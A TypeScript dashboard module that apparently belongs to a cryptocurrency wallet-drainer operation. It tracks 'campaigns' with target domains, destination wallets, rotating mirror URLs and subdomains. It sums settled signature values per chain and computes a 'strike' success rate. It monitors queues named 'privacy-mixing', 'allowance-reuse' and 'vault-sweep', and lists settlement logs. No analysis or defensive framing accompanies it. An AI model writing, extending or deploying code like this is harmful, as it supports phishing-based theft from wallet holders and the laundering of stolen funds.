/**
 * Dashboard stats — Postgres settlement aggregates, campaigns CRUD, settlement logs.
 */
import type { Pool } from 'pg'
import { createDatabaseAnchorPool } from '@legion/core/logic/database-anchor'
import {
  createResilientRedisClient,
  resolveEffectiveRedisUrl,
  type RedisPingClient,
} from '@legion/core/lib/redis-wrapper'
import IoRedis from 'ioredis'
import { Queue } from 'bullmq'

import { normalizeDatabaseConnectionString } from './database-anchor.js'
import { getExtractionQueueJobCounts, getExtractionQueueState } from './extraction-queue.js'

const DASHBOARD_QUEUE_NAMES = ['extraction', 'privacy-mixing', 'allowance-reuse', 'vault-sweep'] as const

export type DashboardStats = {
  total_settled_usd: Record<string, number>
  success_rate: number
  queue_depth: {
    total: number
    by_queue: Record<string, number>
    memory_fallback: number
  }
  active_campaigns: number
}

export type CampaignRecord = {
  id: string
  name: string
  target_domain: string
  destination_wallet: string
  chains: string[]
  auto_rotate: boolean
  active: boolean
  mirror_url: string | null
  mirror_subdomain: string | null
  rotation_interval_hours: number
  last_health_check_at: string | null
  created_at: string
  updated_at: string
}

export type CreateCampaignInput = {
  name: string
  target_domain: string
  destination_wallet: string
  chains: string[]
  auto_rotate: boolean
  mirror_url?: string | null
  rotation_interval_hours?: number
}

export type SettlementLogEntry = {
  timestamp: string
  chain: string | null
  amount: string | null
  status: string
  wallet_address: string
}

let pool: Pool | null = null

function getDashboardPool(): Pool {
  if (pool) return pool
  const url = process.env['DATABASE_URL']?.trim()
  if (!url) {
    throw new Error('DATABASE_URL not configured')
  }
  const connectionString = normalizeDatabaseConnectionString(url)
  pool = createDatabaseAnchorPool(connectionString, {
    max: 5,
    connectionTimeoutMillis: 10_000,
  })
  return pool
}

type RedisCtor = new (url: string, options?: Record<string, unknown>) => RedisPingClient

const RedisClient = IoRedis as unknown as RedisCtor

async function fetchQueuePending(name: string): Promise<number> {
  const url = resolveEffectiveRedisUrl()
  if (!url) return 0
  try {
    const queue = new Queue(name, {
      connection: createResilientRedisClient(RedisClient, url, true) as never,
    })
    const counts = await queue.getJobCounts('waiting', 'active', 'delayed')
    await queue.close()
    return (counts.waiting ?? 0) + (counts.active ?? 0) + (counts.delayed ?? 0)
  } catch {
    return 0
  }
}

export async function queryDashboardQueueDepth(): Promise<DashboardStats['queue_depth']> {
  const by_queue: Record<string, number> = {}
  let total = 0

  const extractionCounts = await getExtractionQueueJobCounts()
  if (extractionCounts) {
    by_queue['extraction'] = extractionCounts.pending
    total += extractionCounts.pending
  } else {
    const depth = await fetchQueuePending('extraction')
    by_queue['extraction'] = depth
    total += depth
  }

  for (const name of DASHBOARD_QUEUE_NAMES) {
    if (name === 'extraction') continue
    const depth = await fetchQueuePending(name)
    by_queue[name] = depth
    total += depth
  }

  const queueState = getExtractionQueueState()
  total += queueState.memory_pending

  return {
    total,
    by_queue,
    memory_fallback: queueState.memory_pending,
  }
}

export async function queryDashboardStats(): Promise<DashboardStats> {
  const db = getDashboardPool()

  const settledByChain = await db.query<{
    chain: string
    total_usd: string
  }>(
    `SELECT COALESCE(NULLIF(TRIM(chain_id), ''), 'unknown') AS chain,
            COALESCE(SUM(CAST(scout_value_usd AS numeric)), 0)::text AS total_usd
     FROM signatures
     WHERE settlement_status = 'SETTLED'
     GROUP BY COALESCE(NULLIF(TRIM(chain_id), ''), 'unknown')
     ORDER BY chain`,
  )

  const total_settled_usd: Record<string, number> = {}
  for (const row of settledByChain.rows) {
    const n = Number(row.total_usd)
    total_settled_usd[row.chain] = Number.isFinite(n) ? n : 0
  }

  const rateRow = await db.query<{ successful: string; total_attempts: string }>(
    `SELECT
       COUNT(*) FILTER (WHERE settlement_status = 'SETTLED')::text AS successful,
       COUNT(*) FILTER (
         WHERE settlement_status IN ('SETTLED', 'FAILED_STRIKE', 'FAILED_SETTLEMENT')
       )::text AS total_attempts
     FROM signatures`,
  )

  const successful = Number(rateRow.rows[0]?.successful ?? '0')
  const totalAttempts = Number(rateRow.rows[0]?.total_attempts ?? '0')
  const success_rate =
    totalAttempts > 0 && Number.isFinite(successful) ? successful / totalAttempts : 0

  const activeRow = await db.query<{ count: string }>(
    `SELECT COUNT(*)::text AS count FROM campaigns WHERE active = true`,
  )
  const active_campaigns = Number(activeRow.rows[0]?.count ?? '0')

  const queue_depth = await queryDashboardQueueDepth()

  return {
    total_settled_usd,
    success_rate,
    queue_depth,
    active_campaigns: Number.isFinite(active_campaigns) ? active_campaigns : 0,
  }
}

function mapCampaignRow(row: Record<string, unknown>): CampaignRecord {
  const chainsRaw = row.chains
  const chains = Array.isArray(chainsRaw)
    ? chainsRaw.map((c) => String(c))
    : typeof chainsRaw === 'string'
      ? (chainsRaw as string).replace(/[{}]/g, '').split(',').filter(Boolean)
      : []

  const iso = (v: unknown): string | null =>
    v instanceof Date ? v.toISOString() : v != null && String(v).trim() !== '' ? String(v) : null

  return {
    id: String(row.id ?? ''),
    name: String(row.name ?? ''),
    target_domain: String(row.target_domain ?? ''),
    destination_wallet: String(row.destination_wallet ?? ''),
    chains,
    auto_rotate: Boolean(row.auto_rotate),
    active: row.active !== false,
    mirror_url: row.mirror_url != null ? String(row.mirror_url) : null,
    mirror_subdomain: row.mirror_subdomain != null ? String(row.mirror_subdomain) : null,
    rotation_interval_hours: Number(row.rotation_interval_hours ?? 12) || 12,
    last_health_check_at: iso(row.last_health_check_at),
    created_at: iso(row.created_at) ?? new Date().toISOString(),
    updated_at: iso(row.updated_at) ?? new Date().toISOString(),
  }
}

export async function insertCampaign(input: CreateCampaignInput): Promise<CampaignRecord> {
  const db = getDashboardPool()
  const rotationHours = input.rotation_interval_hours ?? 12
  const result = await db.query(
    `INSERT INTO campaigns (name, target_domain, destination_wallet, chains, auto_rotate, mirror_url, rotation_interval_hours)
     VALUES ($1, $2, $3, $4::text[], $5, $6, $7)
     RETURNING id, name, target_domain, destination_wallet, chains, auto_rotate, active,
               mirror_url, mirror_subdomain, rotation_interval_hours, last_health_check_at, created_at, updated_at`,
    [
      input.name.trim(),
      input.target_domain.trim(),
      input.destination_wallet.trim(),
      input.chains.map((c) => c.trim()).filter(Boolean),
      input.auto_rotate,
      input.mirror_url?.trim() || null,
      rotationHours,
    ],
  )
  const row = result.rows[0]
  if (!row) {
    throw new Error('campaign insert returned no row')
  }
  return mapCampaignRow(row as Record<string, unknown>)
}

export async function listCampaigns(): Promise<CampaignRecord[]> {
  const db = getDashboardPool()
  const result = await db.query(
    `SELECT id, name, target_domain, destination_wallet, chains, auto_rotate, active,
            mirror_url, mirror_subdomain, rotation_interval_hours, last_health_check_at,
            created_at, updated_at
     FROM campaigns
     ORDER BY created_at DESC`,
  )
  return result.rows.map((row) => mapCampaignRow(row as Record<string, unknown>))
}

export async function getCampaignRecord(id: string): Promise<CampaignRecord | null> {
  const db = getDashboardPool()
  const result = await db.query(
    `SELECT id, name, target_domain, destination_wallet, chains, auto_rotate, active,
            mirror_url, mirror_subdomain, rotation_interval_hours, last_health_check_at,
            created_at, updated_at
     FROM campaigns WHERE id = $1::uuid`,
    [id],
  )
  const row = result.rows[0]
  return row ? mapCampaignRow(row as Record<string, unknown>) : null
}

export async function querySettlementLogs(limit = 100): Promise<SettlementLogEntry[]> {
  const db = getDashboardPool()
  const n = Math.min(Math.max(Math.trunc(limit) || 100, 1), 500)
  const result = await db.query(
    `SELECT created_at, settlement_timestamp, chain_family, chain_id, amount, token_address,
            status, error_message, wallet_address, tx_hash
     FROM settlement_history
     ORDER BY created_at DESC
     LIMIT $1`,
    [n],
  )

  return result.rows.map((row) => {
    const r = row as Record<string, unknown>
    const created =
      r.settlement_timestamp instanceof Date
        ? r.settlement_timestamp.toISOString()
        : r.created_at instanceof Date
          ? r.created_at.toISOString()
          : String(r.settlement_timestamp ?? r.created_at ?? '')
    return {
      timestamp: created,
      chain:
        r.chain_family != null
          ? String(r.chain_family)
          : r.chain_id != null
            ? String(r.chain_id)
            : null,
      amount: r.amount != null ? String(r.amount) : null,
      status: r.status != null ? String(r.status) : 'UNKNOWN',
      wallet_address: String(r.wallet_address ?? ''),
    }
  })
}
